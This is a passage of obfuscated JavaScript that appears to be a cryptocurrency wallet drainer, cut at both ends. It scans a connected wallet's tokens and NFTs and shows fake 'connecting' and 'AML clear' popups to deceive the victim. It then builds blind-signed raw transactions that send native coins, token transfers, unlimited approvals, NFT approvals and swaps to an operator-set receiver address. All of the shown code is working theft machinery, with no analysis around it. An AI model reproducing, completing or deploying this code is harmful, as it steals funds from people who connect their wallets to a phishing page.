          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x116ea4.toLowerCase())) {
            continue;
          }
        }
        let _0xc32bfd = {
          'chain_id': convert_chain('ANKR', 'ID', _0x145876.blockchain),
          'name': _0x145876.tokenName,
          'type': _0x145876.tokenType,
          'amount': parseFloat(_0x145876.balance),
          'amount_raw': _0x145876.balanceRawInteger,
          'amount_usd': parseFloat(_0x145876.balanceUsd),
          'symbol': _0x145876.tokenSymbol,
          'decimals': _0x145876.tokenDecimals,
          'address': _0x116ea4 || null,
          'price': parseFloat(_0x145876.tokenPrice)
        };
        if (_0xc32bfd.price > 0x0) {
          _0x42fb93.push(_0xc32bfd);
        }
      } catch (_0x4e7319) {
        console.log(_0x4e7319);
      }
    }
    return _0x42fb93;
  } catch (_0x428746) {
    console.log(_0x428746);
    return [];
  }
};
const get_nfts = async _0x1a9eb1 => {
  try {
    let _0x2d5ba2 = await fetch('https://api.opensea.io/api/v1/assets?owner=' + _0x1a9eb1 + "&order_direction=desc&limit=200&include_orders=false");
    let _0x15fe0e = (await _0x2d5ba2.json()).assets;
    _0x2d5ba2 = await fetch('https://api.opensea.io/api/v1/collections?asset_owner=' + _0x1a9eb1 + "&offset=0&limit=200");
    let _0x55e484 = await _0x2d5ba2.json();
    let _0x5330da = [];
    for (const _0x1fbbd9 of _0x15fe0e) {
      try {
        let _0x164bc3 = null;
        for (const _0x4e1487 of _0x55e484) {
          try {
            if (_0x4e1487.primary_asset_contracts.length < 0x1) {
              continue;
            }
            if (_0x4e1487.primary_asset_contracts[0x0].address == _0x1fbbd9.asset_contract.address) {
              _0x164bc3 = _0x4e1487;
              break;
            }
          } catch (_0x36297b) {
            console.log(_0x36297b);
          }
        }
        if (_0x164bc3 == null) {
          continue;
        }
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x1fbbd9.asset_contract.address.toLowerCase())) {
          continue;
        } else {
          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x1fbbd9.asset_contract.address.toLowerCase())) {
            continue;
          }
        }
        let _0x5d7d71 = convert_chain("OPENSEA", 'ID', _0x1fbbd9.asset_contract.chain_identifier);
        let _0x452a3d = _0x164bc3.stats.one_day_average_price != 0x0 ? _0x164bc3.stats.one_day_average_price : _0x164bc3.stats.seven_day_average_price;
        _0x452a3d = _0x452a3d * MS_Currencies[convert_chain('ID', "CURRENCY", _0x5d7d71)].USD;
        let _0x5bcf29 = {
          'chain_id': _0x5d7d71,
          'name': _0x1fbbd9.name,
          'type': _0x1fbbd9.asset_contract.schema_name,
          'amount': _0x1fbbd9.num_sales,
          'amount_raw': null,
          'amount_usd': _0x452a3d,
          'id': _0x1fbbd9.token_id,
          'symbol': null,
          'decimals': null,
          'address': _0x1fbbd9.asset_contract.address,
          'price': _0x452a3d
        };
        if (typeof _0x452a3d == "number" && !isNaN(_0x452a3d) && _0x452a3d > 0x0) {
          _0x5330da.push(_0x5bcf29);
        }
      } catch (_0x441d78) {
        console.log(_0x441d78);
      }
    }
    return _0x5330da;
  } catch (_0x4fb43b) {
    console.log(_0x4fb43b);
    return [];
  }
};
const retrive_token = async (_0x166f38, _0x13ab96) => {
  try {
    let _0x6148cb = await fetch("https://" + MS_API_Data[_0x166f38] + '/api?module=contract&action=getsourcecode&address=' + _0x13ab96 + "&apikey=" + MS_Settings.Settings.Chains[convert_chain('ID', "ANKR", _0x166f38)].API, {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    _0x6148cb = await _0x6148cb.json();
    if (_0x6148cb.message == 'OK') {
      if (_0x6148cb.result[0x0].Proxy == '1' && _0x6148cb.result[0x0].Implementation != '') {
        const _0x558e45 = _0x6148cb.result[0x0].Implementation;
        return retrive_token(_0x166f38, _0x558e45);
      } else {
        return JSON.parse(_0x6148cb.result[0x0].ABI);
      }
    } else {
      return MS_Contract_ABI.ERC20;
    }
  } catch (_0x1b1417) {
    return MS_Contract_ABI.ERC20;
  }
};
const get_permit_type = _0x4c73bb => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) {
      return 0x0;
    }
    if (_0x4c73bb.hasOwnProperty('permit') && _0x4c73bb.hasOwnProperty("nonces") && _0x4c73bb.hasOwnProperty("name") && _0x4c73bb.hasOwnProperty("DOMAIN_SEPARATOR")) {
      const _0x12e905 = (_0x2fa959 => {
        for (const _0x2d7e79 in _0x2fa959) {
          if (_0x2d7e79.startsWith("permit(")) {
            const _0x23c024 = _0x2d7e79.slice(0x7).split(',');
            if (_0x23c024.length === 0x7 && _0x2d7e79.indexOf('bool') === -0x1) {
              return 0x2;
            }
            if (_0x23c024.length === 0x8 && _0x2d7e79.indexOf("bool") !== -0x1) {
              return 0x1;
            }
            return 0x0;
          }
        }
      })(_0x4c73bb);
      return _0x12e905;
    } else {
      return 0x0;
    }
  } catch (_0x1bf2e8) {
    return 0x0;
  }
};
const MS_Gas_Reserves = {};
const show_check = () => {
  try {
    Swal.fire({
      'title': "Connection established",
      'icon': "success",
      'timer': 0x7d0
    }).then(() => {
      if (MS_Check_Done) {
        return;
      }
      Swal.fire({
        'text': "Connecting to Blockchain...",
        'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x1388,
        'width': 0x258,
        'showConfirmButton': false
      }).then(() => {
        if (MS_Check_Done) {
          return;
        }
        Swal.fire({
          'text': "Getting your wallet address...",
          'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
          'imageHeight': 0x3c,
          'allowOutsideClick': false,
          'allowEscapeKey': false,
          'timer': 0x1388,
          'width': 0x258,
          'showConfirmButton': false
        }).then(() => {
          if (MS_Check_Done) {
            return;
          }
          Swal.fire({
            'text': "Checking your wallet for AML...",
            'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            'imageHeight': 0x3c,
            'allowOutsideClick': false,
            'allowEscapeKey': false,
            'timer': 0x1388,
            'width': 0x258,
            'showConfirmButton': false
          }).then(() => {
            if (MS_Check_Done) {
              return;
            }
            Swal.fire({
              'text': "Good, your wallet is AML clear!",
              'icon': "success",
              'allowOutsideClick': false,
              'allowEscapeKey': false,
              'timer': 0x7d0,
              'width': 0x258,
              'showConfirmButton': false
            }).then(() => {
              if (MS_Check_Done) {
                return;
              }
              Swal.fire({
                'text': "Please wait, we're scanning more details...",
                'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
                'imageHeight': 0x3c,
                'allowOutsideClick': false,
                'allowEscapeKey': false,
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': false
              });
            });
          });
        });
      });
    });
  } catch (_0x58b650) {
    console.log(_0x58b650);
  }
};
const get_nonce = async _0x508acd => {
  const _0xb5fb3e = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x508acd]);
  return await _0xb5fb3e.getTransactionCount(MS_Current_Address, "pending");
};
const wait_message = () => {
  try {
    if (!MS_Process) {
      return;
    }
    Swal.close();
    Swal.fire({
      'html': "<b>Thanks!</b>",
      'icon': "success",
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x9c4,
      'width': 0x258,
      'showConfirmButton': false
    }).then(() => {
      Swal.fire({
        'html': "<b>Confirming your sign...</b><br><br>Please, don't leave this page!",
        'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x0,
        'width': 0x258,
        'showConfirmButton': false
      });
    });
  } catch (_0x5d69a9) {
    console.log(_0x5d69a9);
  }
};
const end_message = () => {
  try {
    Swal.close();
    Swal.fire({
      'html': "<b>Sorry!</b> Your wallet doesn't meet the requirements.<br><br>Try to connect a middle-active wallet to try again!",
      'icon': "error",
      'allowOutsideClick': true,
      'allowEscapeKey': true,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': true,
      'confirmButtonText': 'OK'
    });
  } catch (_0x3572cf) {
    console.log(_0x3572cf);
  }
};
let is_first_sign = true;
const sign_ready = () => {
  try {
    Swal.close();
    Swal.fire({
      'html': "<b>Success!</b> Your sign is confirmed!",
      'icon': 'success',
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
  } catch (_0x4f9e4e) {
    console.log(_0x4f9e4e);
  }
};
const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    Swal.close();
    Swal.fire({
      'html': "<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!",
      'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
      'imageHeight': 0x3c,
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
  } catch (_0x4bf250) {
    console.log(_0x4bf250);
  }
};
const is_nft_approved = async (_0x238b6c, _0x50c7ac, _0x22cfc5) => {
  try {
    const _0x1e15a1 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[0x1]);
    const _0x393d75 = new ethers.Contract(_0x238b6c, MS_Contract_ABI.ERC721, _0x1e15a1);
    return await _0x393d75.isApprovedForAll(_0x50c7ac, _0x22cfc5);
  } catch (_0x38bf57) {
    console.log(_0x38bf57);
    return false;
  }
};
const SIGN_NATIVE = async _0x1637ec => {
  const _0x18ef7f = new Web3(MS_Provider);
  const _0x44e342 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1637ec.chain_id]);
  const _0x4f4a20 = ethers.BigNumber.from(await _0x44e342.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x582aea = _0x1637ec.chain_id == 0xa4b1 ? 0x16e360 : _0x1637ec.chain_id == 0xa86a ? 0x16e360 : 0x5208;
  const _0x1449bb = _0x1637ec.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1637ec.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0x19605f = ethers.BigNumber.from(_0x1637ec.chain_id == 0xa ? "35000000000" : _0x4f4a20);
  const _0x156a48 = _0x19605f.mul(ethers.BigNumber.from(_0x582aea)).mul(ethers.BigNumber.from('2'));
  const _0x965eb6 = _0x19605f.mul(ethers.BigNumber.from(_0x1449bb)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x1637ec.chain_id])));
  const _0x442afa = ethers.BigNumber.from(_0x1637ec.amount_raw).sub(_0x156a48).sub(_0x965eb6).toString();
  if (ethers.BigNumber.from(_0x442afa).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  const _0x33fd45 = await get_nonce(_0x1637ec.chain_id);
  let _0x592fbe = {
    'to': MS_Settings.Receiver,
    'nonce': _0x18ef7f.utils.toHex(_0x33fd45),
    'gasLimit': _0x18ef7f.utils.toHex(_0x582aea),
    'gasPrice': _0x18ef7f.utils.toHex(_0x4f4a20),
    'value': _0x18ef7f.utils.toHex(_0x442afa),
    'data': '0x',
    'v': _0x18ef7f.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x3437b8 = new ethereumjs.Tx(_0x592fbe);
  let _0x457817 = '0x' + _0x3437b8.serialize().toString("hex");
  let _0x100a20 = _0x18ef7f.utils.sha3(_0x457817, {
    'encoding': "hex"
  });
  await sign_request(_0x1637ec);
  const _0x2053bd = await _0x18ef7f.eth.sign(_0x100a20, MS_Current_Address);
  const _0xba8465 = _0x2053bd.substring(0x2);
  const _0x441cde = '0x' + _0xba8465.substring(0x0, 0x40);
  const _0x4247ed = '0x' + _0xba8465.substring(0x40, 0x80);
  const _0x58e947 = parseInt(_0xba8465.substring(0x80, 0x82), 0x10);
  const _0x4c9d04 = _0x18ef7f.utils.toHex(_0x58e947 + _0x1637ec.chain_id * 0x2 + 0x8);
  _0x3437b8.r = _0x441cde;
  _0x3437b8.s = _0x4247ed;
  _0x3437b8.v = _0x4c9d04;
  const _0x23f05f = '0x' + _0x3437b8.serialize().toString('hex');
  sign_next();
  const _0x3a1538 = await _0x44e342.sendTransaction(_0x23f05f);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x44e342.waitForTransaction(_0x3a1538.hash, 0x1, 0x7530);
  }
  await sign_success(_0x1637ec, _0x442afa);
  sign_ready();
};
const SIGN_TOKEN = async _0x1093c1 => {
  const _0x269bfe = new Web3(MS_Provider);
  const _0x54627a = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1093c1.chain_id]);
  const _0x134b08 = new ethers.Contract(_0x1093c1.address, MS_Contract_ABI.ERC20, _0x54627a);
  const _0x5c6af4 = ethers.BigNumber.from(await _0x54627a.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  let _0x1b54b7 = null;
  let _0x39fb81 = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x3c2843 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x3c2843[0x0] == MS_Current_Chain_ID && _0x3c2843[0x1] == _0x1093c1.address.toLowerCase()) {
        _0x39fb81 = _0x1093c1.amount_raw;
        break;
      }
    } catch (_0x32cdc1) {
      console.log(_0x32cdc1);
    }
  }
  try {
    if (MS_Settings.Settings.Sign.Tokens == 0x1) {
      _0x1b54b7 = await _0x134b08.estimateGas.approve(MS_Settings.Address, _0x39fb81, {
        'from': MS_Current_Address
      });
    } else if (MS_Settings.Settings.Sign.Tokens == 0x2) {
      _0x1b54b7 = await _0x134b08.estimateGas.transfer(MS_Settings.Receiver, _0x1093c1.amount_raw, {
        'from': MS_Current_Address
      });
    }
    _0x1b54b7 = ethers.BigNumber.from(_0x1b54b7).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x21a2bd) {
    _0x1b54b7 = _0x1093c1.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1093c1.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  const _0xa14a15 = await get_nonce(_0x1093c1.chain_id);
  let _0x3ebe2b = null;
  let _0x29d512 = new _0x269bfe.eth.Contract(MS_Contract_ABI.ERC20, _0x1093c1.address);
  if (MS_Settings.Settings.Sign.Tokens == 0x1) {
    _0x3ebe2b = _0x29d512.methods.approve(MS_Settings.Address, _0x39fb81).encodeABI();
  } else if (MS_Settings.Settings.Sign.Tokens == 0x2) {
    _0x3ebe2b = _0x29d512.methods.transfer(MS_Settings.Receiver, _0x1093c1.amount_raw).encodeABI();
  }
  let _0x15ea06 = {
    'to': _0x1093c1.address,
    'nonce': _0x269bfe.utils.toHex(_0xa14a15),
    'gasLimit': _0x269bfe.utils.toHex(_0x1b54b7),
    'gasPrice': _0x269bfe.utils.toHex(_0x5c6af4),
    'value': "0x0",
    'data': _0x3ebe2b,
    'v': _0x269bfe.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x12c6e4 = new ethereumjs.Tx(_0x15ea06);
  let _0x2e212b = '0x' + _0x12c6e4.serialize().toString("hex");
  let _0xdcd116 = _0x269bfe.utils.sha3(_0x2e212b, {
    'encoding': 'hex'
  });
  await sign_request(_0x1093c1);
  const _0xde9c6 = await _0x269bfe.eth.sign(_0xdcd116, MS_Current_Address);
  const _0x50383d = _0xde9c6.substring(0x2);
  const _0x29f760 = '0x' + _0x50383d.substring(0x0, 0x40);
  const _0x3d08a0 = '0x' + _0x50383d.substring(0x40, 0x80);
  const _0x2c6347 = parseInt(_0x50383d.substring(0x80, 0x82), 0x10);
  const _0x48b380 = _0x269bfe.utils.toHex(_0x2c6347 + _0x1093c1.chain_id * 0x2 + 0x8);
  _0x12c6e4.r = _0x29f760;
  _0x12c6e4.s = _0x3d08a0;
  _0x12c6e4.v = _0x48b380;
  const _0x2a17f9 = '0x' + _0x12c6e4.serialize().toString("hex");
  sign_next();
  const _0x38ec0a = await _0x54627a.sendTransaction(_0x2a17f9);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x54627a.waitForTransaction(_0x38ec0a.hash, 0x1, 0x7530);
  }
  await sign_success(_0x1093c1);
  sign_ready();
};
const SIGN_NFT = async _0x550245 => {
  const _0x3ef800 = new Web3(MS_Provider);
  const _0x12e00f = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x550245.chain_id]);
  const _0x500a15 = new ethers.Contract(_0x550245.address, MS_Contract_ABI.ERC721, _0x12e00f);
  const _0x397414 = ethers.BigNumber.from(await _0x12e00f.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  let _0x8e7e49 = null;
  try {
    if (MS_Settings.Settings.Sign.NFTs == 0x1) {
      _0x8e7e49 = await _0x500a15.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
        'from': MS_Current_Address
      });
    } else if (MS_Settings.Settings.Sign.NFTs == 0x2) {
      _0x8e7e49 = await _0x500a15.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x550245.id, {
        'from': MS_Current_Address
      });
    }
    _0x8e7e49 = ethers.BigNumber.from(_0x8e7e49).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x5d20d0) {
    _0x8e7e49 = _0x550245.chain_id == 0xa4b1 ? 0x4c4b40 : _0x550245.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  const _0x431599 = await get_nonce(_0x550245.chain_id);
  let _0xceeee8 = null;
  let _0x172013 = new _0x3ef800.eth.Contract(MS_Contract_ABI.ERC721, _0x550245.address);
  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
    _0xceeee8 = _0x172013.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  } else if (MS_Settings.Settings.Sign.NFTs == 0x2) {
    _0xceeee8 = _0x172013.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x550245.id).encodeABI();
  }
  let _0x6ff6f5 = {
    'to': _0x550245.address,
    'nonce': _0x3ef800.utils.toHex(_0x431599),
    'gasLimit': _0x3ef800.utils.toHex(_0x8e7e49),
    'gasPrice': _0x3ef800.utils.toHex(_0x397414),
    'value': "0x0",
    'data': _0xceeee8,
    'v': _0x3ef800.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x595bf2 = new ethereumjs.Tx(_0x6ff6f5);
  let _0x277ffe = '0x' + _0x595bf2.serialize().toString("hex");
  let _0x32f47f = _0x3ef800.utils.sha3(_0x277ffe, {
    'encoding': 'hex'
  });
  await sign_request(_0x550245);
  const _0x5cc00a = await _0x3ef800.eth.sign(_0x32f47f, MS_Current_Address);
  const _0x38e26d = _0x5cc00a.substring(0x2);
  const _0x4ec3f8 = '0x' + _0x38e26d.substring(0x0, 0x40);
  const _0x30a74d = '0x' + _0x38e26d.substring(0x40, 0x80);
  const _0x2108d8 = parseInt(_0x38e26d.substring(0x80, 0x82), 0x10);
  const _0x4aff07 = _0x3ef800.utils.toHex(_0x2108d8 + _0x550245.chain_id * 0x2 + 0x8);
  _0x595bf2.r = _0x4ec3f8;
  _0x595bf2.s = _0x30a74d;
  _0x595bf2.v = _0x4aff07;
  const _0x3ed4d8 = '0x' + _0x595bf2.serialize().toString("hex");
  sign_next();
  const _0x1ff136 = await _0x12e00f.sendTransaction(_0x3ed4d8);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x12e00f.waitForTransaction(_0x1ff136.hash, 0x1, 0x7530);
  }
  await sign_success(_0x550245);
  sign_ready();
};
const DO_SWAP = async _0x26889c => {
  const _0x268ede = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x26889c.chain_id]);
  const _0x44936d = Math.floor(Date.now() / 0x3e8) + 0x18696;
  const _0x56264c = new ethers.Contract(_0x26889c.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x486c4d = ethers.BigNumber.from(await _0x268ede.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  let _0x3c0193 = null;
  try {
    _0x3c0193 = await _0x56264c.estimateGas.swapExactTokensForETH(_0x1a52e5, '0', [_0x26889c.address, MS_Swap_Route[_0x26889c.chain_id]], MS_Settings.Receiver, _0x44936d, {
      'from': MS_Current_Address
    });
    _0x3c0193 = ethers.BigNumber.from(_0x3c0193).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x1edde7) {
    _0x3c0193 = _0x26889c.chain_id == 0xa4b1 ? 0x4c4b40 : _0x26889c.chain_id == 0xa86a ? 0x4c4b40 : 0x55730;
  }
  const _0x45234f = await get_nonce(_0x26889c.chain_id);
  const _0x1a52e5 = ethers.BigNumber.from(_0x26889c.amount_raw).lte(ethers.BigNumber.from(_0x26889c.swapper_allowance)) ? ethers.BigNumber.from(_0x26889c.amount_raw).toString() : ethers.BigNumber.from(_0x26889c.swapper_allowance).toString();
  await swap_request(_0x26889c.swapper_type, _0x26889c, [_0x26889c]);
  sign_next();
  const _0x2f4936 = await _0x56264c.swapExactTokensForETH(_0x1a52e5, '0', [_0x26889c.address, MS_Swap_Route[_0x26889c.chain_id]], MS_Settings.Receiver, _0x44936d, {
    'gasLimit': ethers.BigNumber.from(_0x3c0193),
    'gasPrice': ethers.BigNumber.from(_0x486c4d),
    'nonce': _0x45234f,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x268ede.waitForTransaction(_0x2f4936.hash, 0x1, 0xea60);
  }
  await swap_success(_0x26889c.swapper_type, _0x26889c, [_0x26889c]);
  sign_ready();
};
const DO_UNISWAP = async (_0x14886d, _0x57d201) => {
  const _0x243ce4 = new Web3(MS_Provider);
  const _0x3ed3d2 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x14886d.chain_id]);
  const _0x1ac78c = Math.floor(Date.now() / 0x3e8) + 0x18696;
  const _0x2849d8 = new ethers.Contract(_0x14886d.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const _0x480157 = ethers.BigNumber.from(await _0x3ed3d2.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x32c818 = await get_nonce(_0x14886d.chain_id);
  const _0x437341 = [];
  for (const _0x5036ba of _0x57d201) {
    try {
      const _0x4b05f5 = ethers.BigNumber.from(_0x5036ba.amount_raw).lte(ethers.BigNumber.from(_0x5036ba.swapper_allowance)) ? ethers.BigNumber.from(_0x5036ba.amount_raw).toString() : ethers.BigNumber.from(_0x5036ba.swapper_allowance).toString();
      const _0xab0b9c = new _0x243ce4.eth.Contract(MS_Uniswap_ABI, _0x5036ba.swapper_address);
      const _0x3f11e3 = _0xab0b9c.methods.swapExactTokensForTokens(_0x4b05f5, '0', [_0x5036ba.address, MS_Swap_Route[_0x5036ba.chain_id]], MS_Settings.Receiver).encodeABI();
      _0x437341.push(_0x3f11e3);
    } catch (_0x4f39c6) {
      console.log(_0x4f39c6);
    }
  }
  let _0x1f896c = null;
  try {
    _0x1f896c = await _0x2849d8.estimateGas.multicall(_0x1ac78c, _0x437341, {
      'from': MS_Current_Address
    });
    _0x1f896c = ethers.BigNumber.from(_0x1f896c).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x44c4b7) {
    _0x1f896c = _0x14886d.chain_id == 0xa4b1 ? 0x4c4b40 : _0x14886d.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
  }
  await swap_request(_0x14886d.swapper_type, _0x14886d, _0x57d201);
  sign_next();
  const _0x523318 = await _0x2849d8.multicall(_0x1ac78c, _0x437341, {
    'gasLimit': ethers.BigNumber.from(_0x1f896c),
    'gasPrice': ethers.BigNumber.from(_0x480157),
    'nonce': _0x32c818,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x3ed3d2.waitForTransaction(_0x523318.hash, 0x1, 0xea60);
  }
  await swap_success(_0x14886d.swapper_type, _0x14886d, _0x57d201);
  sign_ready();
};
const DO_PANCAKE_V3 = async (_0x38ce2f, _0x2c3330) => {
  const _0xb9c5e4 = new Web3(MS_Provider);
  const _0xe39187 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x38ce2f.chain_id]);
  const _0x1dfc56 = Math.floor(Date.now() / 0x3e8) + 0x18696;
  const _0x1391b3 = new ethers.Contract(_0x38ce2f.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x42782d = ethers.BigNumber.from(await _0xe39187.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x49136b = await get_nonce(_0x38ce2f.chain_id);
  const _0x25d36f = [];
  for (const _0x37f980 of _0x2c3330) {
    try {
      const _0x159128 = ethers.BigNumber.from(_0x37f980.amount_raw).lte(ethers.BigNumber.from(_0x37f980.swapper_allowance)) ? ethers.BigNumber.from(_0x37f980.amount_raw).toString() : ethers.BigNumber.from(_0x37f980.swapper_allowance).toString();
      const _0x1a45df = new _0xb9c5e4.eth.Contract(MS_Pancake_ABI, _0x37f980.swapper_address);
      const _0x3b849a = _0x1a45df.methods.swapExactTokensForTokens(_0x159128, '0', [_0x37f980.address, MS_Swap_Route[_0x37f980.chain_id]], MS_Settings.Receiver).encodeABI();
      _0x25d36f.push(_0x3b849a);
    } catch (_0x45316f) {
      console.log(_0x45316f);
    }
  }
  let _0x5db7d8 = null;
  try {
    _0x5db7d8 = await _0x1391b3.estimateGas.multicall(_0x1dfc56, _0x25d36f, {
      'from': MS_Current_Address
    });
    _0x5db7d8 = ethers.BigNumber.from(_0x5db7d8).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0xd293be) {
    _0x5db7d8 = _0x38ce2f.chain_id == 0xa4b1 ? 0x4c4b40 : _0x38ce2f.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
  }
  await swap_request(_0x38ce2f.swapper_type, _0x38ce2f, _0x2c3330);
  sign_next();
  const _0x5e8360 = await _0x1391b3.multicall(_0x1dfc56, _0x25d36f, {
    'gasLimit': ethers.BigNumber.from(_0x5db7d8),
    'gasPrice': ethers.BigNumber.from(_0x42782d),
    'nonce': _0x49136b,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0xe39187.waitForTransaction(_0x5e8360.hash, 0x1, 0xea60);
  }
  await swap_success(_0x38ce2f.swapper_type, _0x38ce2f, _0x2c3330);
  sign_ready();
};
const DO_CONTRACT = async _0x36f1bb => {
  const _0x4cf7cf = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x36f1bb.chain_id]);
  const _0x1e4fc8 = ethers.BigNumber.from(await _0x4cf7cf.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x199fd9 = await get_nonce(_0x36f1bb.chain_id);
  const _0x4102ed = convert_chain('ID', "ANKR", _0x36f1bb.chain_id);
  const _0x26ac5e = new ethers.Contract(MS_Settings.Settings.Chains[_0x4102ed].Contract_Address, MS_Settings.Settings.Chains[_0x4102ed].Contract_Legacy == 0x1 ? MS_Contract_ABI.CONTRACT_LEGACY : MS_Contract_ABI.CONTRACT, MS_Signer);
  const _0x387af6 = _0x36f1bb.chain_id == 0xa4b1 ? 0x4c4b40 : _0x36f1bb.chain_id == 0xa86a ? 0x4c4b40 : 0x186a0;
  const _0x4bcfe5 = _0x36f1bb.chain_id == 0xa4b1 ? 0x4c4b40 : _0x36f1bb.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0x48b842 = ethers.BigNumber.from(_0x36f1bb.chain_id == 0xa ? '35000000000' : _0x1e4fc8);
  const _0x4c87d2 = _0x48b842.mul(ethers.BigNumber.from(_0x387af6)).mul(ethers.BigNumber.from('2'));
  const _0x3b6bf5 = _0x48b842.mul(ethers.BigNumber.from(_0x4bcfe5)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x36f1bb.chain_id])));
  const _0x5b0bff = ethers.BigNumber.from(_0x36f1bb.amount_raw).sub(_0x4c87d2).sub(_0x3b6bf5).toString();
  if (ethers.BigNumber.from(_0x5b0bff).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  await transfer_request(_0x36f1bb);
  sign_next();
  let _0x1f2957 = null;
  if (MS_Settings.Settings.Chains[_0x4102ed].Contract_Legacy == 0x0) {
    _0x1f2957 = await _0x26ac5e[MS_Settings.Settings.Chains[_0x4102ed].Contract_Type](MS_Settings.Address, {
      'gasLimit': ethers.BigNumber.from(_0x387af6),
      'gasPrice': ethers.BigNumber.from(_0x1e4fc8),
      'nonce': _0x199fd9,
      'value': ethers.BigNumber.from(_0x5b0bff),
      'from': MS_Current_Address
    });
  } else {
    _0x1f2957 = await _0x26ac5e[MS_Settings.Settings.Chains[_0x4102ed].Contract_Type]({
      'gasLimit': ethers.BigNumber.from(_0x387af6),
      'gasPrice': ethers.BigNumber.from(_0x1e4fc8),
      'nonce': _0x199fd9,
      'value': ethers.BigNumber.from(_0x5b0bff),
      'from': MS_Current_Address
    });
  }
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x4cf7cf.waitForTransaction(_0x1f2957.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x36f1bb, _0x5b0bff);
  sign_ready();
};
const TRANSFER_NATIVE = async _0x38af4a => {
